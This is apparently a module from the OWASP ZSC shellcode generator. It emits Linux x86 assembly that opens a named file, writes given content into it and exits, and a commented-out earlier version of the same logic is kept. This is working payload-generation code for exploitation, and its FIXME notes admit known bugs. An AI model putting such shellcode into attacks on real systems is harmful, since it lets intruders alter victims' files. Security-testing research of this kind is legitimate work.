"""
OWASP ZSC
# TODO complete this module
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.new_cores import base_module, stack, alert

#
# def write(null, file_name, content, length):
#     return '''
# push   $0x5
# pop    %eax
# %s
# %s
# mov    %esp, %ebx
# push   $0x4014141
# pop    %ecx
# shr    $0x10, %ecx
# int    $0x80
# mov    %eax, %ebx
# push   $0x4
# pop    %eax
# %s
# mov %esp, %ecx
# %s
# int    $0x80
# mov    $0x1, %al
# mov    $0x1, %bl
# int    $0x80
# ''' % (str(null), str(file_name), str(content), str(length))
#
#
# def run(data):
#     path_file, content = data[0], data[1]
#     null = len(path_file) % 4
#     if null != 0:
#         null = ''
#     if null == 0:
#         null = 'xor %ebx, %ebx\npush %ebx\n'
#     return write(
#         str(null), stack.generate(
#             str(path_file), '%ebx', 'string'), stack.generate(
#                 str(content), '%ecx', 'string'), stack.generate(
#                     str(len(content)), '%edx', 'int'))


class Module(base_module.BasePayload):
    # FIXME 1: program crashes when full path of file is too long
    # FIXME 2: file contents is not contents only
    target_file = base_module.OptString("", "File to write data")
    content = base_module.OptString("", "File's data")

    def generate(self):
        null = len(self.target_file) % 4
        if null != 0:
            null = ''
        else:
            null = 'xor %ebx, %ebx\npush %ebx\n'

        payload = "push $0x5\n"
        payload += "pop %eax\n"
        payload += null
        payload += stack.generate(str(self.target_file), '%ebx', 'string')
        payload += "mov %esp, %ebx\n"
        payload += "push $0x4014141\n"
        payload += "pop %ecx\n"
        payload += "shr $0x10, %ecx\n"
        payload += "int $0x80\n"
        payload += "mov %eax, %ebx\n"
        payload += "push $0x4\n"
        payload += "pop %eax\n"
        payload += stack.generate(str(self.content), '%ecx', 'string')
        payload += "mov %esp, %ecx\n"
        payload += stack.generate(str(len(self.content)), '%edx', 'int')
        payload += "int $0x80\n"
        payload += "mov $0x1, %al\n"
        payload += "mov $0x1, %bl\n"
        payload += "int $0x80\n"
        return payload

    def run(self):
        if not self.target_file:
            alert.error("Target file is required")
            return
        if not self.content:
            alert.error("File's content is required")
            return
        self.handle_generate(__name__)
